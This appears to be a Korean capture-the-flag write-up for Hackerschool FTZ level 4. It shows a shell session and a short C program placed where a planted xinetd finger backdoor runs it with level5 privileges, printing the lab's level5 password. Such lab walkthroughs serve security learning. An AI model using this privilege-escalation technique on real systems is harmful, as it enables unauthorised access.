# Hackerschool FTZ Level 04

```
login as: level4
level4@192.168.18.131's password:
[level4@ftz level4]$ ls
hint  public_html  tmp
[level4@ftz level4]$ cat hint


누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!


[level4@ftz level4]$ cd /ect/xinetd.d
-bash: cd: /ect/xinetd.d: No such file or directory
[level4@ftz level4]$ cd /etc/xinetd.d
[level4@ftz xinetd.d]$ ls
backdoor     daytime      echo-udp  rexec   rsync     sgi_fam  time
chargen      daytime-udp  finger    rlogin  servers   talk     time-udp
chargen-udp  echo         ntalk     rsh     services  telnet
[level4@ftz xinetd.d]$ cat backdoor
service finger
{
        disable = no
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = level5
        server          = /home/level4/tmp/backdoor
        log_on_failure  += USERID
}
[level4@ftz xinetd.d]$ cd /home/level4/tmp/backdoor
-bash: cd: /home/level4/tmp/backdoor: No such file or directory
[level4@ftz xinetd.d]$ cd /home/level4/tmp/
[level4@ftz tmp]$ ls
[level4@ftz tmp]$ touch backdoor.c
[level4@ftz tmp]$ ls
backdoor.c
[level4@ftz tmp]$ vi ./backdoor.c
```

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv){
        system("my-pass");
        return 0;
}
```

```
[level4@ftz tmp]$ gcc -o ./backdoor ./backdoor.c
[level4@ftz tmp]$ finger @localhost
^[[H^[[J
Level5 Password is "what is your name?".

[level4@ftz tmp]$
```

`xinetd` 를 이용하여 backdoor 서버를 열었다고 한다.

그 중에서 `finger` 라는 서비스에 대한 데몬에 백도어를 심어놨다고 한다.

`finger` 리모트 유저의 정보를 가져올 때 사용하는 명령어이다.

예를 들어 `finger abc@def.com` 을 하게 되면, `def.com` 의 `abc` 유저에 대한 정보를 가져온다.

`/etc/xintd.d` 에 가면 `backdoor` 이라는 파일이 있는데, 이는 `finger` 를 통해서 어떠한 바이너리를 실행하도록 한다.

그 경로가 바로 `/home/level4/tmp/backdoor` 이며, 유저는 `level5` 의 권한으로 실행된다.

그러므로 `tmp` 에 `backdoor` 이라는 실행파일을 넣어주면 된다.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv){
        system("my-pass");
        return 0;
}
```

이것을 넣어 `my-pass` 를 실행하게 하였다.